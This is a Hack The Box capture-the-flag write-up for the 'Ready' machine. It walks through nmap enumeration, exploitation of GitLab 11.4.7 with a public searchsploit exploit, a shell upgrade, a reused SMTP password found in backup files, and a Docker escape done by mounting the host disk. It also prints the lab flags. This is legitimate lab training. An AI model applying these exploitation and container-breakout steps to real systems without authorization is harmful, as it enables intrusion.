# HTB Ready Writeup
IP = 10.10.10.220

## Enumeration


Starting as always with nmap:
```nmap -sV -sC 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 01:54 IST
Nmap scan report for 10.10.10.220
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-title: GitLab is not responding (502)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
```

So there is 2 ports open, ssh and http...  
also we go a robots.txt file and we know its gitlab  

We got an login and register option  
So lets make a user...  
![login](https://user-images.githubusercontent.com/51215035/110734281-28d4ae00-8230-11eb-9596-049a1f5aa5e8.png)  
   
After logging in first we will check the version of gitlab:  
![version](https://user-images.githubusercontent.com/51215035/110735162-e44a1200-8231-11eb-8e73-3165fa8d8e7d.png)


I like what i see!, lets searchsploit!  
```searchsploit gitlab 11.4.7```
![search](https://user-images.githubusercontent.com/51215035/110735664-e6f93700-8232-11eb-87e1-be225c69ebe0.png)
Nice!  

## Exploitation

I tried the first exploit one, it didnt work, but the second exploit working great  
```
searchsploit -m ruby/webapps/49257.py  
```  


Edit the code a bit:  
![code](https://user-images.githubusercontent.com/51215035/110735341-4acf3000-8232-11eb-9488-213d826ebca1.png)
(for the authenticity token i capture a request to open new repository with burp)


And run...  
![run](https://user-images.githubusercontent.com/51215035/110735474-8964ea80-8232-11eb-8b23-bcc08cba7091.png)


Getting normal shell:  
```
which python3
/opt/gitlab/embedded/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
```
For some reason I could read the user flag from here...  
```
cat /home/dude/user.txt
  e1e30b052b6ec0670698805d745e7682
```  


## Privilage escalation

It took me quite a long time to find something, I was just looking all over trying to find something until I got to /opt/backup/  
There I just cat everything and grep for password.  
![pass](https://user-images.githubusercontent.com/51215035/110736211-ed3be300-8233-11eb-91a8-59767be2456f.png)  


Found: ```gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"```

And there was the most frustrating part in this box for me, I was sure I'm done but there was no flag in /root folder  
Than i realized I was in a docker...  
So I googled "docker escape" and found this:  
[HackTricks ](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)  

Starting to test some things from the article  
```
fdisk -l
```
Then
```
mkdir -p /mnt/hola
mount /dev/sda2 /mnt/hola
```
And wallah, as simple as this, now when im going to hola directory, I'm out of the docker, so all what left to do is grab the root flag.  
```
root@gitlab:/mnt# cd hola/root
  cd hola/root
root@gitlab:/mnt/hola/root# cat root.txt
  cat root.txt
  b7f98681505cd39066f67147b103c2b3
```


